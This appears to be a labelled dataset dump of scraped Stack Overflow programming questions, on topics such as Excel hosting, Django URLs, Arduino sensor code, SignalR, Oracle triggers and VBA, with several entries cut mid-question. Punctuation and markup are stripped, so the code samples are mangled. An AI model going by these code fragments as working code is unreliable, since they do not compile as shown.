I tried wrapping the above code in a trycatch block to see what happens. It never reaches the codecatchcode block. Excel 2013 crashes with the infamous Application has stopped working. Send report to MS error. I have already turned on all Win32  COM  C Exceptions in Visual Studio through strongDebugstrong menu  strongExceptionsstrong dialog, but that doesnt help either. There is a strongDebugstrong button in the error dialog. If I click that and open a debugger, the error msg I see is  0xC0000005 Access violation reading location 0x0000000000000000.p  pI also found that commenting out the codeWS.CHILDcode line in the above code doesnt strictly make the worksheet readonly. It just blocks common keyboardmouse input from reaching the worksheet. But some keys like the contextmenu key of the keyboard still reaches there and the context menu is shown rightclicking through the mouse doesnt work though. Similarly, I can interact with the Office Ribbon through the mouse. It appears as if only the worksheet area the grid with the white background is not receiving keyboardmouse input.p  pstrongEDIT 2strongp  pI just recalled that apparently in contrast to what Hans Passant has explained in his post below, VS2010 hosts an Excel instance in itself when you create a Excel VSTO Workbook project. Though I dont have VS2013 Full with me and cant confirm, I suspect VS2013 would do the same with Excel 2013 VSTO Workbook projects. Considering that VS2010 and above are all WPF applications themselves, how does that fit in the picturep  pstrongEDIT 3strongp  pThat emprivate interfacesem theory suggested by acelent see comment below appears to be correct. I spied into VS2010hosted Excel instance and found that there was a new window with classname  strongEXCELIstrong which is not there when we normally open Excel normal hierarchy of windows is XLMAIN application  XLDESK workspace area  EXCEL7 workbook. Also that workbook is no longer available as an ActiveX object, which used to be the cases back when Office Web Components library was available last shipped with Office 2003. So all in all, we seem to be on a dead end and Im going to suggest Hanss answer to my client unless someone comes up with an actual working method in the next few hours.p

Negative 1652 pIm facing a couple of issues with a Java app and another in C. Here is the thing. Theres a server application that receives request through HTTP, process it and sends back the response.

We have many operations that the server recognizes and one of the them is used to generate the the public and private keys used to exchange with the clients. Each client has a unique ID, so when this operation named GetEncryptionKey is executed, it generates the private key and save it locally in the server and generates the public key which is sent back in PEM format, like thisp  precodeencryptionKeyBEGIN PUBLIC KEY MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAon1WDHdarN7yq0UOevzW 5PiFsSC8bEkTUOZ6X3RIthRCU42pUjZ8fp9T8rbWp8CqbhlFDxU4cYucpGljC 7A10nkrPoBT0lpHEuXJiSgx9qqsyo9q6GddhOpdMaZ6VCfIJCM3kdJNMH3ro iWLPHLB8lxnfT2CHyZVQGhkzrH9fk1XhdenXxjtPGpwYBOsUZUwRt8EeW6JUwSI mKXiXag0IViEcyAa2BvProkxklbQB3BczLHdXjIDwnE6u1aMA7pYPSkBtY6tuQ0F 5sNWXHsaKWON33MnbhlM7sieYDi9L4dWksalammdIeHIXzX4ZCYdOhayWWKZ1N HwIDAQAB END PUBLIC KEY codepre  pThis is working ok.

Negative 1652 pI want to refer to some instance of a data through my URL.

So how do you handle this usuallyp  pDetailsp  pI use django for my website. I have a model called Team. Any teacher can create her own Team online at which point it gets added to the database. I do not require the Team name to be unique. A teacher can have multiple teams.p  pNow any action add students to the team, assign homework to the team anything, requires that a reference to the team should be passed in the URL. Something likep  precode  SITEURL addstudent team  codepre  pSince names are nonunique, I cannot use the name. p  pCurrently, I assign a UUID to every team when it is created and use the uuid in my URLs. That works, but it makes for ugly URLs.p  pI could use primary key of the team, which would be shorter than the uuid, but again not a very nice URL. I also wonder whether exposing primary key of a models database entry is a security issue Though, I noticed that SO seems use primary keys in its URLs.p  pSo what is the best practice herep

Negative 1652 pI am working on a selfbalancing robot project and am using the ADXL345 accelerometer alongside the ITG3200 gyro to sense the tilt of the robot.p  pI was having problems earlier with signed integers not displaying correctly, as it turns out, the Arduino Due stores standard integers as 32 bit numbers which resulted in the 16 bit signed data coming out all positive and over 65000 for negatives. I did some research and have implemented codeint16tcode throughout to maintain a signed 16 bit system however I have come across a new issue.p  pIt seems that after the robot is tilted any more than 35 degrees or so in either direction the integers begin to overflow and any numbers over 32,767 begin to decrease again. This obviously would not be suitable when determining the angle of the robot. Is there any way to scale back these values or otherwise receive a constant stream of valid data for the complete rangep  pSee code belowp  precodeinclude ltstdint.hgt  int16t accelx int16t accely int16t accelz  int16t gyrox int16t gyroy int16t gyroz   void setup     Init serial output   Serial.begin57600       Init sensors   delay50   Give sensors enough time to start   I2CInit   AccelInit   GyroInit   void loop    ReadAccel   Serial.printA   Serial.printaccelx Serial.print,   Serial.printaccely Serial.print,   Serial.printaccelz Serial.println    ReadGyro   Serial.printG   Serial.printgyrox Serial.print,   Serial.printgyroy Serial.print,   Serial.printgyroz Serial.println    I2C code to read the sensors include ltWire.hgt   Sensor I2C addresses define ACCELADDRESS int 0x53  0x53  0xA6  2 define GYROADDRESS  int 0x68  0x68  0xD0  2   void I2CInit    Wire.begin   void AccelInit    Wire.beginTransmissionACCELADDRESS   Wire.write0x2D   Power register   Wire.write0x08   Measurement mode   Wire.endTransmission   delay5   Wire.beginTransmissionACCELADDRESS   Wire.write0x31   Data format register   Wire.write0x08   Set to full resolution   Wire.endTransmission   delay5     Adjust the output data rate to 100Hz 50Hz bandwidth   Wire.beginTransmissionACCELADDRESS   Wire.write0x2C   Rate   Wire.write0x0A   Set to 100Hz, normal operation   Wire.endTransmission   delay5    Reads x, y and z accelerometer registers void ReadAccel    int i  0   byte buff[6]    Wire.beginTransmissionACCELADDRESS    Wire.write0x32   Send address to read from   Wire.endTransmission    Wire.beginTransmissionACCELADDRESS   Wire.requestFromACCELADDRESS, 6   Request 6 bytes   whileWire.available   Wire.availableampampilt6         buff[i]  Wire.read   Read one byte     i      Wire.endTransmission        accelx   buff[2] ltlt 8  buff[3]   X axis internal sensor y axis     accely   buff[0] ltlt 8  buff[1]   Y axis internal sensor x axis     accelz   buff[4] ltlt 8  buff[5]   Z axis internal sensor z axis      void GyroInit     Power up reset defaults   Wire.beginTransmissionGYROADDRESS   Wire.write0x3E   Wire.write0x80   Wire.endTransmission   delay5     Select fullscale range of the gyro sensors    Set LP filter bandwidth to 42Hz   Wire.beginTransmissionGYROADDRESS   Wire.write0x16   Wire.write0x1B   DLPFCFG  3, FSSEL  3   Wire.endTransmission   delay5     Set sample rato to 100Hz   Wire.beginTransmissionGYROADDRESS   Wire.write0x15   Wire.write0x09    SMPLRTDIV  9 100Hz   Wire.endTransmission   delay5     Set clock to PLL with z gyro reference   Wire.beginTransmissionGYROADDRESS   Wire.write0x3E   Wire.write0x00   Wire.endTransmission   delay5    Reads x, y and z gyroscope registers void ReadGyro    int i  0   byte buff[6]    Wire.beginTransmissionGYROADDRESS    Wire.write0x1D   Sends address to read from   Wire.endTransmission    Wire.beginTransmissionGYROADDRESS   Wire.requestFromGYROADDRESS, 6   Request 6 bytes   whileWire.available   Wire.availableampampilt6         buff[i]  Wire.read   Read one byte     i      Wire.endTransmission        gyrox  buff[2] ltlt 8  buff[3]     X axis internal sensor y axis     gyroy  buff[0] ltlt 8  buff[1]     Y axis internal sensor x axis     gyroz  buff[4] ltlt 8  buff[5]     Z axis internal sensor z axis     codepre

Negative 1652 pI have an asp.net MVC 4.0 application. In one of my views, I wish to display a list of current news codeIEnumerableltNewsgtcode coming from a Web API.p  pThe thing is that the list of news may or may not be updated frequently. In other words, on an average day, the backend team may have to enter from 5 to 45 news using the backend CMS.p  pI need to figure out a way to refresh the users list of news within his browser without, of course, refreshing the entire web page.p  pMy initial thought would have been to add a JavaScript codesetIntervalcode method that would call the Web API every X milliseconds thus pulling the information and refreshing the list of news.p  pAlthough this would work, I would like to use a different approach and use codeSignalRcode since I believe the requirement fits with what codeSignalRcode has to offer.p  pAfter reading and looking at some examples on codeSignalRcode, Im starting to understand the idea behind it but Im still a bit confused.p  pThe examples I see are Chat rooms and games where users can click stuff which triggers a call to the codehubcode.p  pIn my task, the user strongWILL NOTstrong have anything to click. The codehubcode server should be responsible of calling the client every X milliseconds to update the list of news.p  pIn terms of performance, it would be ridiculous to send the entire list of news at each X milliseconds and overwrite the UI. p  pI would need a way to compare the list of news currently showing in the users browser with the new list of news inside the hub. Once the compare is done, only send the new compared list of news.p  pDoes anyone have any example of such a scenario or can give me some pointers on how to get this startedp  pThanksp
Negative 1652 pI am pushing one set of commits to GitHub from my Django app directory and another set of commits from my templates directory. Because each is a different directory, I had to set up a git remote in each one so that it knows to push to GitHub. p  pstrongHeres the problemstrong Each set of commits has its own master branch that isnt aware of the other. First, I push the commits from the Django app directorys master branch to GitHubs master branch and that works fine. But then, if I push the set of commits from the template directorys master branch to the same GitHub master branch, I get an error saying that I need to do a merge before I can push. The push goes through after I do the merge, but its annoying to have to keep merging the GitHub master to the different master branches of my different Django directories. p  pstrongMy question isstrong is it possible to set one master branch for all the different django directories I need to work with so that i can just do one push for files in all my directories It seems that I need to initialize a .git file for each directory I want to work with which consequently gives each directory its own master branch.p

Negative 1652 pIve been reading the book by Andrei Alexandrescu Modern C Design. And i have a question about the decomposition of a class into policies. p  pBasically what would be a good policy size  Most examples show parts like construction, destruction, thread safety and so on. Simply put small policies .p  pWhat if i want to create a file io class, that takes a file type as a policy, e.g.p  precodestruct XXType      void  AsyncReadcallback c     void Writeconst uint8 image   struct YYType      void  AsyncReadcallback c     void Writeconst uint8, image, uint32 offset   templateltclass FileType  XXTypegt class File  public FileType      virtual void OnDataReadconst uint8, uint32 size  0     ...  codepre  pIdea is to inherit from file and create a different templates that can later be spawned when needed. Would this be a good fit for policies or should i just pass the file handle to global static functions or should i just create a class for each type of file  I want to make sure the user errors are low  and policies seem to be less error prone.p  pEditp  pThanks Claudiordgz for a great indept answerp  pTo give another example would be taking the network approach.p  pUPD and TCP are very similar and very different at the same time. They both need a socket but one is connectionless the other connectionoriented. But logically they still remain a part of the transport and if i would like to create a higher level of abstraction say a application layer protocol, so taking Claudiordgz it would at least for me make sense to use the transportlayer as a policy due to its place on the network stack.p

I see a section there called codeWarning configurationscode, but I dont see the warning I am looking for.p  pstrongUpdatestrong  It turns out that I am trying to do this for VB.NET.  Thanks to a link provided by the selected answer, you have to edit the project files XML and supply the warning code in the codeltNoWarngtltNoWarngtcode tag.  However, you have to know the warning code which is hidden in the error list.  One way to get it is to open the output window and build the project.  In my case, the warnign code is code40000code.  It shows as codeBC40000code, but I had to remove the codeBCcode.  After rebuilding the project, the warning messages went away.p

Negative 1652 pSo I am currently writing an App and have a few questions about how to deal with AsyncTasks. I describe my problem as detailed as I can. I have the following classesp  ol listrongMainActivitystrong  This Activity only executes codesetContentViewR.layout.myLayoutcode and creates an Object of my strongCustomLocationListenerstrong. The Layout contains a custom view and a codeProgressBarcode.li listrongCustomLocationListenerstrong  This is basically just a Class which implements codeLocationListenercode and has the default codeLocationListenercode methods. In addition to that I wrote a method to check which providers are enabled to prior use the codeNETWORKPROVIDERcode. li listrongDisplaystrong  This is just an assisstant class. I use it only to get display metrics to calculate some things.li listrongMyCustomViewstrong  This class extends the codeViewcode class. It also has an Attribute of the type codeDisplaycode my own class. li ol  pNow you should know everything important to my code. Well, my question now is, how to deal with AsyncTasks, since this are the steps the App should go throughp  ol liGet the current location of the users deviceli liExecute some queries to a database server mysql and save them non persistent the data consists of city namesli liCalculate the distance between the users location and the cities in the databaseli liDo some other calculations to figure out the positions where to draw on the screenli liDraw everythingli ol  pOn top of that I would like to implement a progress bar, which should be active untill all calculations are done and the drawing phase begins. So, Im kinda confused where to code what. I mean, both calculations step 3. and 4. have to know about each other. The calculation of step 4 needs the results of the calculation of step 3. And my Activity class should also know about the state of the calculations, since I have to make the ProgressBar invisible when I start to draw.p  pI hope I was detailed enough and I appreciate your helpp

Negative 1652 pIm calling a JavaScript function that wants an array of things to display.  It displays a count, and displays the items one by one.  Everything works when I pass it a normal JavaScript array.p  pBut I have too many items to hold in memory at once.  What Id like to do, is pass it an object with the same interface as an array, and have my methods be called when the function tries to access the data.  And in fact, if I pass the followingp  precodevar featureArray  length count, 0 func0 codepre  pthen the count is displayed, and the first item is correctly displayed.  But I dont want to assign all the entries, or Ill run out of memory.  And the function currently crashes when the user tries to display the second item.  I want to know when item 1 is accessed, and return func1 for item 1, and func2 for item 2, etc. i.e., delaying the creation of the item until it is requested.p  pIs this possible in JavaScriptp

Negative 1652 pI would like to find a way which would allow to compare a SIFT descriptor of an image query with descriptors in a SQL database which contains lots of descriptors of differents pictures.p  pIn fact, my final purpose is to do an application which allow to compare one picture with lots of picture in a database not in my device but in a SQL database.p  pThe first thing i thought was to stock each descriptors on the SQL database and compare each descriptors to another one using the Brute Force method or the FlanneBased method. The problem is that,in a SQL database, it would take a long time to compute a matching because of the mathematics behind the matching Euclidean distance for example is sqrtab ...  and its not possible to do that kind of comparison in an huge database.p  pFor example a SIFT descriptor contains 128 numbers if im not mistaken so imagine the time comparing each number of each descriptors together.p  pIf there another way to do that stuff  I know in a SQL database, requests are efficient when you use something like SELECT a FROM b WHERE ...p  pTherefore i wonder if there is a way to stock SIFT descriptors in an efficiently way  For example i thought about to crypte the descriptors into a kind of big string chain and each chain would be unique and therefore i could compare them together but i dont know if its a good solution.p  pIve already read this post  a hrefhttpstackoverflow.comquestions3505674comparingsiftfeaturesstoredinamysqldatabaseComparing SIFT features stored in a mysql databasea but it didnt help me.

Negative 1652 pHere goes... I need to draw several annular sectors in VisualBasic.NET using a codeGraphicsPathcode.p  pI would for instance enter the annular sectors outer and inner diameterradius and a starting and ending degreeradiant. The function must then return a codeGraphicsPathcode that can simply be added to another codeGraphicsPathcode as a closed shape. This seems very easy to do, but I need it to keep a 5 pixel gap between the annular sectors.p  pI will explain more... If for instance I enter 0 degrees as starting point and 360 degrees as ending point it must return a codeGraphicsPathcode with an annular sector that starts at X degrees where X is 2.5 pixels offset from 0 degrees and ends at Y degrees where Y is 2.5 pixels offset from 360 degrees. Both the outer and inner curves of the annular sector must adhere to the above. It basically must be as if I drew two parallel lines 5 pixels apart through the circles center at the degrees entered and used the lines as starting and ending points for the arcs. This must hold true for any Degrees entered.p  pThis post a hrefhttpstackoverflow.comquestions11479185svgdonutsliceaspathelementannularsectorSVG donut slice as path element annular sectora Almost solves the problem, but it draws all annular sectors from the center point not unlike Pie slices outwards causing consecutive outer rings to have bigger and bigger gaps in between if you split them with 1 Degree each time plus it is for SVG.p  pI include an image explaining what I am trying to say better a hrefhttpsonedrive.live.comredirresid79292E5BC057FE03112ampauthkeyAMnkq0bjbsH4BwUampv3ampithintphoto2cjpg relnofollowhttpsonedrive.live.comredirresid79292E5BC057FE03112ampauthkeyAMnkq0bjbsH4BwUampv3ampithintphoto2cjpgap  pThis question was solved by a hrefhttpstackoverflow.comusers2261657valtervaltera.

Negative 1652 pIs it possible to have both foreign key constraint and a trigger that keep the referential integrityp  pI dont think that is possible and we have to remove the constraint and keep the referential integrity using trigger.

So now is it possible to add the following codep  precode    create or replace TRIGGER TABLE1TABLE2     after update of TABLE1PRIMARYKEY on TABLE1 codepre  pOf course it came to my mind to lose the constraint and continue with the trigger but is it the only wayp  pBy the way this code is just for practice, I know it isnt a good idea to update the primary key of a table. p  pI found a useful article on one of Microsoft websites confirming my idea that the constraints should be removed. But of course the solution for Oracle may be different from any other database. The article is about a hrefhttptechnet.microsoft.comenuslibraryaa90268428vsql.8029.aspxsqlrefintegritytopic06 relnofollowImplementing Referential Integrity and Cascading Actionsa and the part that is related is Implementing ON DELETE CASCADE and ON UPDATE CASCADE with triggers and after that comes Before continuing, you need to drop the existing foreign keys.p

However, the .NET process is occasionally logging the following error ...p  pcodeSystem.IO.IOException The process cannot access the file serverPathFileName.dat because it is being used by another process.codep  pI say occasionally  we are currently testing, so when volumes increase this may become much more of an issuep  pThe Delphi code looks like this p  precodeAssignFileFTextFile, Formatss.part, [DMSPath, FullFileName]  try   try     ReWriteFTextFile     WritelnFTextFile, MetaDataString   finally       CloseFileFTextFile   end except   raise ELogFileException.Create LOGFILEWRITEFAILURE  end codepre  pThen there is a separate method which performs the following lines of codep  precodeif FindFirstFormats.part,[DMSPath], faAnyFile, SearchRec  0 then begin   repeat     OldName  Formatss,[DMSPath, SearchRec.Name]     NewName  Formatss,[DMSPath, ChangeFileExtSearchRec.Name, .dat]     RenameFileOldName, NewName   until FindNextSearchRec ltgt 0   FindCloseSearchRec end codepre  pI cannot see anything inherently wrong with this code and we have a couple of remedies in mind, but I have 2 questionsp  ol liShould I try a different technique to more reliably protect the .dat file until it is fully readyli liWhat circumstances could be causing thisli ol  hr  pSo far there has been one suggested cause  Antivirus software.p  pAny suggestions as to how the file might be produced differently  Note that my application is Delphi5 I wondered if there was a newer, more atomic version of the MoveFileA WinApi call I could use.p

Negative 1652 pIve got a GridView with a custom Adapter, displaying thumbnails of pictures to the user. I can select and deselect pictures I use setAlpha0.25 on the views to notify the user of the change, and thats all well and fine.p  pNow what I want to do next, is have a button on top of the gridview that clears the whole selection, i.e. call setAlpha1.0 on all views that were changed. So far I can reset my elements in the adapter, and I can setAlpha to 1, but the view doesnt update unless I scroll it out of the display, and then get back to it, or notify the adapter of changes, which redraws all my views, which does not look too pretty if only one element was selected.p  pI already dynamically set and reset individual elements through the GridViews onClickListener, but cant do this for more.

Negative 1652 pIve been experimenting with stacking WKWebViews in a UINavigationController as a method of making a hybrid app thats more native than PhoneGap. It broadly works  I hook into decidePolicyForNavigationAction when a WKWebView hits a link, and push a new ViewController with the link it wants.p  pBut the page loading is slow. Ive done everything I can think of to speed it up  its using loadHTMLString rather than a request to ensure everything is local  Ive even tried stripping out the CSS and JS to see if that speeds it up, but no dice. It still takes at least 500ms for a short, HTML only, locally stored page to appear in the empty WKWebView. I can tell from debugging that the delay is not in reading the HTML from disk, but the time between loadHTMLString and didFinishNavigation.p  pDoes anyone have any tactics for fixing this Id try to preload the view, only I dont know which link the user is going to tap so I dont know what to preload. p

Negative 1652 pI noticed there was another questions asked like this one but it didnt get any answers. Im following the Lynda.com course Up and Running W Laravel and for every example Im having to run p  precodephp artisan serve codepre  pbecause the artisan server keeps shutting down whenever I go to codehttplocalhost8000code. I notice in the video hes just refreshing the page. Ive looked online and the most I can come up with is the other unanswered a hrefhttpstackoverflow.comquestions21058785phpartisanserveshutsdownafterrunningonceSO Questiona which suggests that something called Basset is the problem. I have no idea what Basset is or why it would be the problem. It suggested switching to grunt but Im not sure how to start that. I was hoping that it might be a matter of me changing some settings somewhere.  I also saw some comments that said that it might have been an issue with the browser I was using but i tested it on Firefox, Safari and Chrome to the same result.p  pAny help would be appreciatedp
Negative 1652 pIt seems like most of the documentation  tutorials that Ive found about multitenanted apps seem to prefer scoping via a subdomain. The old classicstyle basecamp probably set the presendent for this, where each user  company would have a a hrefhttpmycompany.app.com relnofollowhttpmycompany.app.coma address. Apps like Harvest, for example, also do this. p  pI recently noticed that the new basecamp no longer has company subdomains...p  pJust wondering what the advantages of scoping through a subdomain are vs. say, scoping the Users data through a gem like Pundit or CanCan p

Negative 1652 pIve got a game with a MasterViewController. It has a Play button that segues to the GameViewController. The GameViewController and GameScene are plain vanilla what a game build provides except I added an NSLog to the GameScenes update method and, on the storyboard, created a Quit button that segues back from the GameViewController to the MasterViewController. p  pEverything works as expected. I fire up the app and touch the Play button and it transitions to the GameViewController to the GameScene. Fine, I see the standard Hello World message and can touch to create spinning spaceships. I start getting the NSLog output from the update method. Great.p  pHowever, when I click the Quit button and it segues back to the MasterViewController, I am still getting the NSLog output from the GameScene update method so the GameScene is still active.

After clicking the kbdOkkbd button, the retrieved dictionary is printed to stdout.p  pMy question is, how can I modify the dictionary when the tree view is modified Is there a way to automatically attach a function to be executed on each item modification So that when editing, for example, a codefloatcode in the tree view, then the corresponding value will be updated as float in the dictionaryp  pThe dictionary does not have a fixed size and the types on it may change. The list of types is limited and known though and, for this example, could be reduced to codeintcode, codestrcode, codefloatcode, codeOthercode. It can be assumed as well that the parents are not supposed to be editable and the children are only editable in the second column, just as it is shown in the example bellow.p  pHere is the code I havep  precodeimport sys from PyQt4 import QtGui, QtCore, uic from copy import deepcopy   class TestDialogQtGui.QDialog     def initself, data          superTestDialog, self.init          self.data  deepcopydata           Layout         btOk  QtGui.QPushButtonOK         btCancel  QtGui.QPushButtonCancel         self.tree  QtGui.QTreeView         hbox  QtGui.QHBoxLayout         hbox.addStretch1         hbox.addWidgetbtOk         hbox.addWidgetbtCancel         vbox  QtGui.QVBoxLayout         vbox.addLayouthbox         vbox.addWidgetself.tree         self.setLayoutvbox         self.setGeometry300, 300, 600, 400           Button signals         btCancel.clicked.connectself.reject         btOk.clicked.connectself.accept           Tree view         self.tree.setModelQtGui.QStandardItemModel         self.tree.setAlternatingRowColorsTrue         self.tree.setSortingEnabledTrue         self.tree.setHeaderHiddenFalse         self.tree.setSelectionBehaviorQtGui.QAbstractItemView.SelectItems          self.tree.model.setHorizontalHeaderLabels[Parameter, Value]          for x in self.data             if not self.data[x]                 continue             parent  QtGui.QStandardItemx             parent.setFlagsQtCore.Qt.NoItemFlags             for y in self.data[x]                 value  self.data[x][y]                 child0  QtGui.QStandardItemy                 child0.setFlagsQtCore.Qt.NoItemFlags                                  QtCore.Qt.ItemIsEnabled                 child1  QtGui.QStandardItemstrvalue                 child1.setFlagsQtCore.Qt.ItemIsEnabled                                  QtCore.Qt.ItemIsEditable                                   QtCore.Qt.ItemIsSelectable                 parent.appendRow[child0, child1]             self.tree.model.appendRowparent          self.tree.expandAll      def getdataself         return self.data  class Otherobject     def initself, x, y         self.x  x         self.y  y     def reprself         return s, s  self.x, self.y  class ExampleQtGui.QWidget      def initself          superExample, self.init          btn  QtGui.QPushButtonButton, self         btn.resizebtn.sizeHint         btn.clicked.connectself.showdialog          self.data            This example will be hidden has no parametervalue pair         self.data[example0]            A set example with an integer and a string parameters         self.data[example1]           self.data[example1][int]  14         self.data[example1][str]  asdf          A set example with a float and other nonconventional type         self.data[example2]           self.data[example2][float]  1.2         self.data[example2][other]  Other4, 8      def showdialogself         dialog  TestDialogself.data         accepted  dialog.exec         if not accepted             return         self.data  deepcopydialog.getdata         print self.data   if name  main      app  QtGui.QApplicationsys.argv     ex  Example     ex.show     sys.exitapp.exec codepre

Negative 1652 pGood day, Iv implemented a REST service. In the URL of resource endpoint I use IDs which are primary keys of tables of the database. For example codehttphostmyappitemsitem4code. Iv learned using the database ID in the URL is a bad practice and I should use UUID instead. On the other hand Iv learned that using UUIDs in indexes is a performance issue if theres many records in the database because they are not sequential 1,2,3,.... So Iv got an idea to encrypt the database ID. This is how it could workp  precode1 Client POSTs an item to httphostmyappitems. 2 The backend creates a new item in the database. 3 Autoincremented ID 4 is generated by the database. 4 The backend encrypts the ID 4 to fa4ce3178a045b2a using a cipher key and returns encrypted ID of a created resource. codepre  pAnd thenp  precode5 Client sends a request to GET httpmyappitemsitemfa4ce3178a045b2a. 6 The backend decrypts fa4ce3178a045b2a to 4 using an cipher key. 7 The backend fetches item with primary key 4 and sends it to the client. codepre  pWhat are the cons of such solution Will the encryptiondecryption will be fast enough so that its not worse then using UUID And what encryption algorithm should I use so that it is fast and doesnt consume much resources Could someone more experienced advise or recommend a better solution Thank you in advance.

Negative 1652 pI am writing a service which serves stateless incoming requests. The requests are all mathematical calculation, which does not take very long to execute  max 2ms. p  pI use Tibco EMS to communicate between clientserver. A client library is provided which wraps the client side logic e.g. convert data into EMS message etc and send the request to a request queue. The server side processes the request and send the response into a separate queue. This works fine.p  pThe server side is multithreaded. A new thread is created when a new incoming request is received. Requests are therefore handled concurrently.p  pThe server side uses one single EMS connection to the EMS server. However, because EMS Session is not thread safe, if I want to be able to write the response to EMS queue in each thread, I have to create one session for each thread using the connectionFactory.

However, I also have a requirement that the GridView scale across all displays  all the way up to 27 monitor with 2560x1440 resolution, so Id put the GridView into a ViewBoxp  precode        ltViewbox Margin0,50,0,0               StretchUniformToFill              StretchDirectionBothgt         ltGridView ItemsSourceBinding Items                   ItemTemplateStaticResource TileDataTemplate                   StyleStaticResource GalleryGridViewgt             ltGridView.ItemContainerStylegt                 ltStyle TargetTypeFrameworkElementgt                     ltSetter PropertyMargin                             Value0 0 2 2 gt                 ltStylegt             ltGridView.ItemContainerStylegt         ltGridViewgt     ltViewboxgt codepre  pProblem here is that were ending up with double scrollbars, because the app is initially designed for 1366x768 and the scaleup isnt quite matching.

Negative 1652 pI am trying to make the generation of voxelcubes more efficient. First of all I calculate on the cpu which faces are not hidden by other voxelscubes. Than I send the voxelcube position and the face normal to the gpu  the vertex, geometry and fragment shader. So now I want simply to generate in the geometry shader a triangle strip from the strongvoxel positionstrong and strongface normalstrong. But now I have problems to calculate the four new vertices from these two informations, I cant find a solution without if and else functions. And since I use backface culling I have to pay attention to the order I emit the vertices from the shader, too. Whats the most efficient way to solve my problem Or have someone a better idea than my approachp  pThe normal vector can only have 6 states, for each face of a cube 0, 0, 1 Front 0, 0, 1 Back 0, 1, 0 Up 0, 1, 0 Down 1, 0, 0 Right 1, 0, 0 Leftp

Negative 1652 pI have a MKMapView in which I can have multiple ARDVenueAnnotationView subclass of MKAnnotationView with a custom image at same coordinates. Thus, these annotations overlap. What I have done for this, is to change the codeanchorPointcode of the annotation views layer. This is working as image below 4 centered annotations have the same coordinates p  pimg srchttpi.stack.imgur.comBIMzd.png altp  pBesides, I would like the annotations to change their image orientation so the little image tail points to the coordinate dont mind the annotations order p  pimg srchttpi.stack.imgur.com7dmZG.png altp  pHere comes my issue, when I codesetImagecode on my annotation view, constructing this image with code UIImage imageWithCGImagescaleorientationcode, the orientation does not change.

This method never changes the image orientation default image has the tail at bottom right and it keeps rendering as first picture above.p  pWhen I add an codeUIImageViewcode as subview of my annotation view, it shows the good image orientation as shown in the second picture.p  pMy questions p  pWhy codesetImagecode does not consider the image orientation  Or maybe I am doing something wrong...p  pHow can I achieve this without adding UIImageView as subview  after all, codeimagecode property is here for a reasonp

Negative 1652 pI am building a site using bootstrap and I need to display a calculation based on options selected from two different select lists. The price displayed is dependent on the area from list number one and the number selected from list two. So for example, list one has a list of areas and list two has a list used for number of passengers. The price is driven by the Area and then the number of passengers. So if I select Blacktown then 2 it should drive a price. If I select Mt Druitt and 2, it should be a different price etc. The second part to this is that I need the price to display in a field which I have added the disabled attribute to so that customers do not type anything into the field. Hope this makes sense.

Negative 1652 pIm new to WPF MVVM so, this is a very simple test program exposing a TextBox update issue. Referring to the code below, checking the CheckBox Nameview1TextBox1 in View1.xml invokes the property ViewModel1BoolField1 ViewModel1.cs where RunTest Model1.cs is called. RunTest then returns a string ViewModel1.cs. This string is then assigned to the ViewModel1StringField1 property. This is where the issue occurs as the TextBox view1TextBox1 View.xml is not updated with the test string Testing 123. Im not sure if Im using OnPropertyChanged ViewModelBase.cs or the the view1TextBox1 UpdateSourceTriggerPropertyChanged View1.xml correctly to update the TextBox.  Any insight would be great.

The author of the above article Ive included remarks that scala.concurrent Futures dont get merged once they return but that Twitters futures some how manage this. Im using the PlayFramework implementation, however, which uses futures provided by the standard Scala 2.1X library.p  pDo any of you have evidence that support or dismiss these claims Does my code pose a memory leakp

Negative 1652 pQuestion p  pYoure given a string S of N characters. Its known that the string consists of lowercase latin letters. The string is generated randomly. That means that every symbol is chosen randomly and independently from others from the set a, b, ..., z. All the letters has equal probability to appear.p  pYoure given Q queries on this string. Each query is of the form P C, where P is an integer between 1 and N both inclusive and C is a character from the set a, b, ..., z. Both P and C were chosen at random and independently from other queries.p  pWhen you have a query of the form P C you have to change the Pth symbol of S to C. After every change we ask you to output the number of distinct nonempty substrings of S.p  pInput Format  The first line of input consists of two single space separated integers N and Q  the length of the string S and the number of queries respectively.p  pThe second line contains the string S itself.p  pThe following Q lines describe the queries in the form P C, where P and C are also separated with a single space.p  pConstraintsp  p4  N  75000  4  Q  75000p  pOutput Format  Output Q lines.

Negative 1652 pIm writing a rather simple HTTP Proxy in Java for a University Project thus Im only allowed to use the builtin JDK functionality.p  pIm quite confused about persistent connections while writing my software. The proxy should be able to parsemanipulate all the http messages so I need to collect everything and cant just forward it.p  pHeres how I do the basic things in principle One thread is listening for connections from the browser. When a connection appears, I start a thread. It reads from the stream client  proxy and forwards it on proxy  server. p  pNow I have heard that a browser may use the same connection to the proxy for different hosts so it is possible that there is 1 thread for clientproxy communication and multiple  child threads which forward to different hosts.p  pMy proxy works already in some cases. But I have issues with threads not getting killed.p  pWhen do I actually have to close my Java socket streams for the different connectionsp  pstrongRight now I do for the different streamsstrongp  ul liclientproxy do nothing  li liproxy1 server close when proxy reads 1    from client li li1 server  proxy nothingli liproxy  client close when    ALL serverclient threads read 1. so when every server has    closed its connection to the proxy.li ul  pBut that doesnt quit get it right and I have a hard time debugging.p  pIs this in principle correctp  pAnd to add Do I have to take care of proxyconnectionkeepalive and Connectionclose headers or can I just forward them Because at the moment I dont do anything related to them, but I have a feeling that this is the main issue, I just want to be sure.p

After about 4 hours of research today, I settled on this code, which works exactly as I want it to, yet there is a nagging feeling that this method is inefficient. Is this creating separate insert queries for each photos information For reference, the codenamescode array is created by the uploading script and only contains the filename, codeactivecode is a hardcoded variable that can be changed through an update page elsewhere in this system.p  precodesql  INSERT INTO photos photofilename, photoactive, photocreated     VALUES , , NOW stmtgtpreparesql foreach names as filename  stmtgtbindparamsi, filename, active stmtgtexecute  imageOK  stmtgtaffectedrows codepre  pIf this code is in fact creating multiple insert queries, any help on how to insert a group of records could be 25, could be 75 or more in one single query would be greatly appreciated.

Negative 1652 pI have an excel sheet which has a button which when pressed shows up an userform where the user enters his credentials to login to a website from excel. Now I am trying to add another sheet with another button which does the same functionality but login to another website.

In short, is there a way for my VBA code to know from which page the userform was initialised.br In this case how can I reuse the same user form twice p

